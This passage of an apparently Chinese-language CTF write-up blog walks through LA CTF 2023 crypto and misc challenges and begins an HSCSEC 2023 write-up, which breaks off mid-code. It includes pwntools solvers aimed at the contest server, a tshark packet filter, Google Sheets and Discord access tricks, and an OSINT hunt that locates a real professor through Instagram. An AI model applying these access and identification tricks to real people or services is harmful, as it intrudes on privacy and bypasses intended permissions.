class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>                <span class="hljs-built_in">print</span>(f.readline())<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;nope&quot;</span>)<br>        exit()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;bye&quot;</span>)<br>        exit()<br><br></code></pre></td></tr></table></figure><h4 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h4><p><code>print(target%modulus)</code>令modulus大于target就可以泄露target<br><img src="/mdimg/lactf/15.png"></p><h3 id="rolling-in-the-mud"><a href="#rolling-in-the-mud" class="headerlink" title="rolling in the mud"></a><strong>rolling in the mud</strong></h3><h4 id="题目说明-10"><a href="#题目说明-10" class="headerlink" title="题目说明"></a>题目说明</h4><p>uugh, these pigs in my pen are making a complete mess! They’re <em>rolling</em> all over the place!<br>Anyway, can you decode this cipher they gave me, almost throwing it at me while rolling around?<br>Answer in lowercase with symbols. In the image, { and } are characters that should appear in your flag, and replace spaces with _.</p><h4 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="/mdimg/lactf/16.png"><br>显然猪圈<br><a href="http://moersima.00cha.net/zhuquan.asp">http://moersima.00cha.net/zhuquan.asp</a><br><code>&#123;eombmcvcalebupauntcnjppmjfnicnappmjfnippmjfni&#125;dugip</code><br>逆序一下然后<br><a href="http://www.quipqiup.com/">http://www.quipqiup.com/</a>爆破一下<br><code>lactf&#123;rolling_and_rolling_and_rolling_until_the_pigs_go_home&#125;</code></p><h3 id="greek-cipher"><a href="#greek-cipher" class="headerlink" title="greek cipher"></a>greek cipher</h3><h4 id="题目说明-11"><a href="#题目说明-11" class="headerlink" title="题目说明"></a>题目说明</h4><p>You think you’ve seen all of the “classic” ciphers? Instead of your standard cipher, I’ve created my own cipher: the monoalphagreek cipher!<br>Answer with just the flag in lowercase with symbols left in.</p><h4 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">κςκ ωπν αζπλ ιησι χνοςνθ μσγθσρ λσθ ζπι ιηγ δςρθι ψγρθπζ ςζ ηςθιπρω θνθψγμιγκ πδ νθςζε γζμρωψιςπζ? τγ ζγςιηγρ. κςκ ωπν αζπλ ιησι χνοςνθ μσγθσρ λσθ ψρπξσξοω δονγζι ςζ εργγα? τγ ζγςιηγρ. ς οςαγ ηπλ εργγα μησρσμιγρ οππα ιηπνεη, γυγζ ςδ ς μσζ<span class="hljs-string">&#x27;ι ργσκ ιηγτ. οσμιδ&#123;ς_ενγθθ_νθςζε_τσζω_εργγα_μησρσμιγρθ_κςκζ&#x27;</span>ι<span class="hljs-literal">_</span>θιπψ<span class="hljs-literal">_</span>ωπν.<span class="hljs-literal">_</span>λγοο<span class="hljs-literal">_</span>ψοσωγκ<span class="hljs-literal">_</span>ς<span class="hljs-literal">_</span>τνθι<span class="hljs-literal">_</span>θσω.μπζερσιθ!&#125;<br></code></pre></td></tr></table></figure><p>参考了国外师傅的wp，只能说6666<br><code>**print(&#39;&#39;.join(sorted(set(input()))))**</code><br>这段代码实现了一个字符串的去重排序功能。它会接收用户的输入作为字符串，将其转换为一个集合，从而删除重复的字符。然后，它将集合排序，并将其转换回字符串。最后，代码使用 “print” 函数打印出结果。<br>然后借助一个工具网站<a href="https://tio.run/#">https://tio.run/#</a><br><img src="/mdimg/lactf/17.png"><br>然后用Cyberchef的Substitute<br><img src="/mdimg/lactf/18.png"><br>最后quipqiup<br><img src="/mdimg/lactf/19.png"></p><h3 id="guess-the-bit"><a href="#guess-the-bit" class="headerlink" title="guess-the-bit!"></a>guess-the-bit!</h3><h4 id="题目说明-12"><a href="#题目说明-12" class="headerlink" title="题目说明"></a>题目说明</h4><p>I’m trying out for this new game show, but it doesn’t seem that hard since there are only two choices? Regardless, I heard someone name Pollard could help me out with it?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br><br>n = <span class="hljs-number">43799663339063312211273714468571591746940179019655418145595314556164983756585900662541462573429625012257141409310387298658375836921310691578072985664621716240663221443527506757539532339372290041884633435626429390371850645743643273836882575180662344402698999778971350763364891217650903860191529913028504029597794358613653479290767790778510701279503128925407744958108039428298936189375732992781717888915493080336718221632665984609704015735266455668556495869437668868103607888809570667555794011994982530936046877122373871458757189204379101886886020141036227219889443327932080080504040633414853351599120601270071913534530651</span><br><br>a = <span class="hljs-number">6</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n = &quot;</span>, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a = &quot;</span>, <span class="hljs-number">6</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">150</span>):<br>    bit = random.randrange(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)<br>    c = random.randrange(<span class="hljs-number">0</span>, n)<br>    c = c**<span class="hljs-number">2</span><br>    <span class="hljs-keyword">if</span> bit == <span class="hljs-number">1</span>:<br>        c *= a<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c = &quot;</span>, c)<br>    guess = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;What is your guess? &quot;</span>))<br>    <span class="hljs-keyword">if</span> guess != bit:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Better luck next time!&quot;</span>)<br>        exit()<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Congrats! Here&#x27;s your flag: &quot;</span>)<br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).readline().strip()<br><span class="hljs-built_in">print</span>(flag)<br>exit(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><h4 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路"></a>解题思路</h4><p>仔细观察加密源码逻辑，进行了 150 次循环，每次循环都生成一个随机数字 c，该数字要么是原始数字的平方，要么是原始数字的平方与 6的积。所以需要猜测该数字是否是平方或者6的倍数。<img src="/mdimg/lactf/20.png"><br>如上图所示，如果两个条件都成立，向服务器返回”1” ，否则返回 “0” 。可以一个个去算，但是捏，150次，懂自懂，所以借助pwntools来写个脚本来交互。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy.ntheory.primetest <span class="hljs-keyword">import</span> is_square <br><br>p = remote(<span class="hljs-string">&#x27;lac.tf&#x27;</span>, <span class="hljs-number">31190</span>)<br>p.recvline()<br>p.recvline()<br><br>C = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> C != <span class="hljs-number">150</span>:<br>    c = <span class="hljs-built_in">int</span>((p.recvline().decode()).split(<span class="hljs-string">&quot; &quot;</span>)[-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">if</span> c%<span class="hljs-number">6</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> is_square(c//<span class="hljs-number">6</span>):<br>        p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        p.sendline(<span class="hljs-string">b&quot;0&quot;</span>)<br>    C += <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(C,end=<span class="hljs-string">&quot;\r&quot;</span>)<br><span class="hljs-built_in">print</span>(p.recv(<span class="hljs-number">1024</span>))<br><span class="hljs-built_in">print</span>(p.recv(<span class="hljs-number">1024</span>))<br><br><span class="hljs-comment"># lactf&#123;sm4ll_pla1nt3xt_sp4ac3s_ar3n&#x27;t_al4ways_e4sy&#125;</span><br></code></pre></td></tr></table></figure><h3 id="chinese-lazy-theorem-2"><a href="#chinese-lazy-theorem-2" class="headerlink" title="chinese-lazy-theorem-2"></a>chinese-lazy-theorem-2</h3><h4 id="题目说明-13"><a href="#题目说明-13" class="headerlink" title="题目说明"></a>题目说明</h4><p>Ok I’m a little less lazy now but you’re still not getting much from me.<br><code>nc lac.tf 31111</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/local/bin/python3</span><br><br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br><span class="hljs-keyword">from</span> Crypto.Random.random <span class="hljs-keyword">import</span> randint<br><br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n = p*q*<span class="hljs-number">2</span>*<span class="hljs-number">3</span>*<span class="hljs-number">5</span><br><br><br>target = randint(<span class="hljs-number">1</span>, n)<br><br><br>oracle_uses = <span class="hljs-number">0</span><br><br><br><span class="hljs-built_in">print</span>(p)<br><span class="hljs-built_in">print</span>(q)<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;This time I&#x27;ll answer 2 modulus questions and give you 30 guesses.&quot;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;What do you want?&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1: Ask for a modulus&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2: Guess my number&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;3: Exit&quot;</span>)<br>    response = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br><br><br>    <span class="hljs-keyword">if</span> response == <span class="hljs-string">&quot;1&quot;</span>:<br>        <span class="hljs-keyword">if</span> oracle_uses == <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;too lazy&quot;</span>)<br>            <span class="hljs-built_in">print</span>()<br>        <span class="hljs-keyword">else</span>:<br>            modulus = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Type your modulus here: &quot;</span>)<br>            modulus = <span class="hljs-built_in">int</span>(modulus)<br>            <span class="hljs-keyword">if</span> modulus &lt;= <span class="hljs-number">0</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;something positive pls&quot;</span>)<br>                <span class="hljs-built_in">print</span>()<br>            <span class="hljs-keyword">elif</span> modulus &gt; <span class="hljs-built_in">max</span>(p, q):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;something smaller pls&quot;</span>)<br>                <span class="hljs-built_in">print</span>()<br>            <span class="hljs-keyword">else</span>:<br>                oracle_uses += <span class="hljs-number">1</span><br>                <span class="hljs-built_in">print</span>(target%modulus)<br>                <span class="hljs-built_in">print</span>()<br>    <span class="hljs-keyword">elif</span> response == <span class="hljs-string">&quot;2&quot;</span>:<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>            guess = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Type your guess here: &quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(guess) == target:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>                    <span class="hljs-built_in">print</span>(f.readline())<br>                    exit()<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;nope&quot;</span>)<br>        exit()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;bye&quot;</span>)<br>        exit()<br></code></pre></td></tr></table></figure><h4 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h4><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy.ntheory.modular <span class="hljs-keyword">import</span> crt<br><br><span class="hljs-keyword">with</span> remote(<span class="hljs-string">&quot;lac.tf&quot;</span>, <span class="hljs-number">31111</span>) <span class="hljs-keyword">as</span> r:<br>p = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>q = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>r.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>r.readuntil(<span class="hljs-string">b&quot;Type your modulus here: &quot;</span>)<br>r.sendline(<span class="hljs-built_in">str</span>(p).encode())<br>x = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>r.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>r.readuntil(<span class="hljs-string">b&quot;Type your modulus here: &quot;</span>)<br>r.sendline(<span class="hljs-built_in">str</span>(q).encode())<br>y = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>a, b = crt([p,q],[x,y])<br>r.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>r.readuntil(<span class="hljs-string">b&quot;Type your guess here: &quot;</span>)<br>r.sendline(<span class="hljs-built_in">str</span>(a+i*b).encode())<br><span class="hljs-built_in">print</span>(r.readline())<br></code></pre></td></tr></table></figure><p><img src="/mdimg/lactf/21.png"></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="CATS"><a href="#CATS" class="headerlink" title="CATS!"></a>CATS!</h3><h4 id="题目说明-14"><a href="#题目说明-14" class="headerlink" title="题目说明"></a>题目说明</h4><p>CATS OMG I CAN’T BELIEVE HOW MANY CATS ARE IN THIS IMAGE I NEED TO VISIT CAN YOU FIGURE OUT THE NAME OF THIS CAT HEAVEN?<br>Answer is the domain of the website for this location. For example, if the answer was ucla, the flag would be lactf{ucla.edu}.</p><h4 id="解题思路-12"><a href="#解题思路-12" class="headerlink" title="解题思路"></a>解题思路</h4><p>g0at：一眼丁真的社工题<br><img src="/mdimg/lactf/22.png"><br><img src="/mdimg/lactf/23.png"><br><a href="https://www.mentalfloss.com/article/576608/lanai-cat-sanctuary-hawaii-shelters-600-cats">https://www.mentalfloss.com/article/576608/lanai-cat-sanctuary-hawaii-shelters-600-cats</a>文章里面有他们的官网 如下图所示<br><img src="/mdimg/lactf/24.png"></p><h3 id="hike-to-where"><a href="#hike-to-where" class="headerlink" title="hike to where?"></a>hike to where?</h3><h4 id="题目说明-15"><a href="#题目说明-15" class="headerlink" title="题目说明"></a>题目说明</h4><p>Where was this photo taken? I think it used to be in the original photo, but someone cropped it out!<br>The flag is <code>lactf&#123;location&#125;</code>, where location is the name of the POI that this person hiked up to, all lowercase and replacing spaces with underscrolls. Use the google maps name of the POI: for example, if the solution is the UCLA Bruin Bear statue, <a href="https://www.google.com/maps/place/Bruin+Statue,+Los+Angeles,+CA+90095/@34.0709817,-118.4451726,21z/data=!4m6!3m5!1s0x80c2bc88d12933e3:0xa3b319ea03ca4057!8m2!3d34.0709621!4d-118.4449902!16s%2Fg%2F12hl7g0mm">this</a> is the google maps location, and the flag would be <code>lactf&#123;bruin_statue&#125;</code>.<br>Please note: contacting anyone or any organization beyond official LA CTF support channels regarding this challenge is against the rules. Please be respectful of those who are involved in this challenge.<br><img src="/mdimg/lactf/25.png"></p><h4 id="解题思路-13"><a href="#解题思路-13" class="headerlink" title="解题思路"></a>解题思路</h4><p>从他的衣服上面的字可以知道他是ucla的计算机学院的老师<br>尝试在ucla的官网找这个老师，但是没找到<br><img src="/mdimg/lactf/26.png"><br>em…….识别出来的这个是生物老师<br>题目是远足，那就google一下<br><img src="/mdimg/lactf/27.png"><br>在Instagram里面找到这个人<a href="https://www.instagram.com/peaksandprofessors.ucla/">https://www.instagram.com/peaksandprofessors.ucla/</a><br><img src="/mdimg/lactf/28.png"><br><img src="/mdimg/lactf/29.png"><br><code>lactf&#123;skull_rock&#125;</code></p><h3 id="hidden-in-plain-sheets"><a href="#hidden-in-plain-sheets" class="headerlink" title="hidden in plain sheets"></a>hidden in plain sheets</h3><h4 id="题目说明-16"><a href="#题目说明-16" class="headerlink" title="题目说明"></a>题目说明</h4><p>I found this google sheets link on the internet. I’m sure it’s hiding something, but I can’t find anything? Can you find the flag?<br>Choose any link (they’re all the same):  <a href="https://docs.google.com/spreadsheets/d/1OYx3lCccLKYgOvzxkRZ5-vAwCn3mOvGUvB4AdnSbcZ4/edit">Link 1</a> <a href="https://docs.google.com/spreadsheets/d/17A1f0z8rmR7356fcHmHTHt3Y0JMgcHlGoflADtNXeOU/edit">Link 2</a> <a href="https://docs.google.com/spreadsheets/d/1ULdm_KCOYCWuf6gqpg6tm0t-wnWySX_Bf3yUYOfZ2tw/edit">Link 3</a></p><h4 id="解题思路-14"><a href="#解题思路-14" class="headerlink" title="解题思路"></a>解题思路</h4><p>flag在另一个Sheet但我们没有查看权限<img src="/mdimg/lactf/30.png"><br>经过查资料发现Google表格的<code>IMPORTRANGE</code>函数可以做到倒入内容这一点。<br><img src="/mdimg/lactf/31.png"><br>所以直接get flag<br><img src="/mdimg/lactf/32.png"></p><h3 id="ECB"><a href="#ECB" class="headerlink" title="ECB"></a>ECB</h3><h4 id="题目说明-17"><a href="#题目说明-17" class="headerlink" title="题目说明"></a>题目说明</h4><p>I was trying to send a flag to my friend over UDP, one character at a time, but it got corrupted! I think someone else was messing around with me and sent extra bytes, though it seems like they actually abided by RFC 3514 for once. Can you get the flag?</p><h4 id="解题思路-15"><a href="#解题思路-15" class="headerlink" title="解题思路"></a>解题思路</h4><p>UDP流量分析，采用了RFC 3514 <a href="https://www.ietf.org/rfc/rfc3514.txt">https://www.ietf.org/rfc/rfc3514.txt</a><br><img src="/mdimg/lactf/33.png"><br>:::tips<br>Flags是flag Segment的缩写，是标志字段。<br>它其实是IP报文头中的一个字段，因为TCP、UDP协议，应用层协议大部分都是封装在IP包中的，所以分析这些协议时，就会经常看到这个字段。<br>标识字段有3位。<br>Reserved bit：1位,是保留位，一般用不上；<br>Don’t fragment ：1位，用来表示数据包是否分片（Not set表示数据包没有分片）；<br>More fragment：1位，用来表示是否是最后一个片段（Not set表示是最后一个）。<br>:::<br>查看flags字段和Data段，data段有1字节数据。<br><img src="/mdimg/lactf/34.png"><br>往下看，在N0.5，<br><img src="/mdimg/lactf/35.png"><br>查看RFC 3514官方文档，如果IP<code> Reserved bit</code> 设置为 <code>1 (0x1)</code>，则它是一个恶意数据包。<br><img src="/mdimg/lactf/36.png"><br>所以我们只需要将<code>Reserved bit</code>为0的包过滤出来，将data和Reserved bit设置为列，并将Reserved bit为0设置为过滤条件，也就是<code>ip.flags.rb == 0</code>，观察前几个发现就是lactf的hex值。<br><img src="/mdimg/lactf/37.png"><br>导出过滤后的udp流<br>选择导出特定分组<br><img src="/mdimg/lactf/38.png"><br>打开保存的udp流量包<br>追踪udp流<br><img src="/mdimg/lactf/39.png"><br><code>lactf&#123;3V1L_817_3xf1l7R4710N_4_7H3_W1N_51D43c8000034d0c&#125;</code><br>tshark：<br><code>**tshark -r EBE.pcap -Y &quot;ip.flags.rb == 0x0&quot; -T fields -e data | xxd -r -p**</code><br><img src="/mdimg/lactf/40.png"></p><h3 id="discord-l34k"><a href="#discord-l34k" class="headerlink" title="discord l34k"></a>discord l34k</h3><h4 id="题目说明-18"><a href="#题目说明-18" class="headerlink" title="题目说明"></a>题目说明</h4><p>My friend sent me <a href="https://discord.com/channels/1060030874722259057/1060030875187822724/1060031064669700186">this</a> message link that apparently links to a “flag”, but discord says “You don’t have access to this link”! They did mention something about them being able to embed a list of online users on their own website, and sent me this image. Can you figure out how to join the server?<br>Note: Discord phone verification is NOT required for this challenge.</p><h4 id="解题思路-16"><a href="#解题思路-16" class="headerlink" title="解题思路"></a>解题思路</h4><p>题目给了一个discord链接<br><code>[https://discord.com/channels/1060030874722259057/1060030875187822724/1060031064669700186](https://discord.com/channels/1060030874722259057/1060030875187822724/1060031064669700186)</code><br><a href="https://discord.com/blog/add-the-discord-widget-to-your-site/">https://discord.com/blog/add-the-discord-widget-to-your-site/</a> 在这篇文章中找到关键图片<br><img src="/mdimg/lactf/41.png"><br>图片下面看到用于 JSON API的URL。在给定的 URL 中，第一个 ID ( 1060030874722259057) 指的是服务器，因此我们将其放在图像中示例 ID 的位置。这给了我们链接<br><code>[https://discordapp.com/api/servers/1060030874722259057/widget.json](https://discordapp.com/api/servers/1060030874722259057/widget.json)</code><br><img src="/mdimg/lactf/42.png"><br>打开之后发现是个邀请链接，打开之后进入LA CTF-Chall Server 5服务器，就可以看到flag了<br><img src="/mdimg/lactf/43.png"><br><img src="/mdimg/lactf/44.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HSCSEC 2023-wp</title>
    <link href="/2023/02/13/HSCSEC%202023-wp/"/>
    <url>/2023/02/13/HSCSEC%202023-wp/</url>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="Ancient-MISC"><a href="#Ancient-MISC" class="headerlink" title="Ancient-MISC"></a>Ancient-MISC</h1><h3 id="Watch-the-sky-at-night"><a href="#Watch-the-sky-at-night" class="headerlink" title="Watch the sky at night"></a>Watch the sky at night</h3><p>24星宿<br><code>斗木獬角木蛟奎木狼亢金龙 牛金牛女土蝠氐土貉井木犴 虚日鼠房日兔心月狐鬼金羊 危月燕室火猪尾火虎柳土獐 壁水貐箕水豹斗木獬牛金牛 女土蝠角木蛟亢金龙星日马 虚日鼠张月鹿娄金狗翼火蛇 危月燕氐土貉房日兔轸水蚓 室火猪心月狐井木犴胃土雉 壁水貐斗木獬鬼金羊柳土獐 牛金牛尾火虎箕水豹女土蝠 虚日鼠昴日鸡柳土獐毕月乌 危月燕觜火猴角木蛟星日马 室火猪参水猿奎木狼壁水貐 斗木獬娄金狗牛金牛女土蝠 虚日鼠胃土雉张月鹿昴日鸡 危月燕翼火蛇室火猪亢金龙 壁水貐斗木獬轸水蚓井木犴 牛金牛氐土貉房日兔女土蝠 虚日鼠危月燕心月狐尾火虎 室火猪鬼金羊柳土獐壁水貐</code><br><img src="/mdimg/hscsec/1.png"><br>东北西南依次对应0123，4进制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">m = <span class="hljs-string">&quot;&quot;</span><br>text =<span class="hljs-string">&quot;1020,1103,1003,1103,1011,1003,1323,1003,1032,1133,1001,1232,1203,1221,1211,1232,1310,1133,1001,1100,1331&quot;</span><br><br>c=text.split(<span class="hljs-string">&quot;,&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:<br>        temp = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(i)):<br>            temp += <span class="hljs-built_in">int</span>(i[j]) * (<span class="hljs-number">4</span> ** (<span class="hljs-built_in">len</span>(i) - j -<span class="hljs-number">1</span>))<br>        m += <span class="hljs-built_in">chr</span>(temp)<br><span class="hljs-built_in">print</span> (m)<br><span class="hljs-comment">#HSCSEC&#123;CN_Ancient_AP&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Deduced-gossip"><a href="#Deduced-gossip" class="headerlink" title="Deduced gossip"></a>Deduced gossip</h3><p>盗墓笔记看多了，了解一点，一眼八卦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">☲☵ ☷☵☳ ☶空 ☷☵☳ ☶☱ ☶空 ☷空☱ ☶空 ☷☳☰ ☷☳☱ ☷☴☳ ☷☳☳ ☷☴☶ ☷☳☳ ☷☷☰ ☷☳空 ☰☴ ☷☴☶ ☷☴☶ ☷☴空 ☷空☲<br></code></pre></td></tr></table></figure><p>八卦有八个卦象，还有一个空字，猜测9进制<br>猜格式是HSCSEC{}<br>前7个对应9进制<code>80,102,74,102,76,74,146</code>，最后一个是<code>148</code><br>则还剩下3，5没有对应，尝试两次就行<br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">dict1 = &#123;<span class="hljs-string">&#x27;☵&#x27;</span>:<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;☷&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;☳&#x27;</span>:<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;☴&#x27;</span>:<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;空&#x27;</span>:<span class="hljs-string">&#x27;4&#x27;</span>,<br>        <span class="hljs-string">&#x27;☰&#x27;</span>:<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;☱&#x27;</span>:<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;☶&#x27;</span>:<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;☲&#x27;</span>:<span class="hljs-string">&#x27;8&#x27;</span>&#125;<br>dict2=&#123;<span class="hljs-string">&#x27;☵&#x27;</span>:<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;☷&#x27;</span>:<span 